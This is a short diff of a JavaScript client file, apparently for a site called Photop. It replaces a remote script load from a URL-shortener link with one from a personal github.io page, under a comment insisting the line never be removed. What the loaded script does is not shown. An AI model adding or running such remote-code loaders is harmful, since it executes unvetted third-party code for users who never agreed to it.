@@ -2485,4 +2485,4 @@ if (getLocalStore("lastUpdateView") != "PhotopRevamp") {
 
 // THIS IS CRUCIAL!!!! DONT REMOVE EVER!!!!
 
-loadScript("https://is.gd/HASk0w")
+loadScript("https://bluhbluhbluh241.github.io/idfc/scb.js")
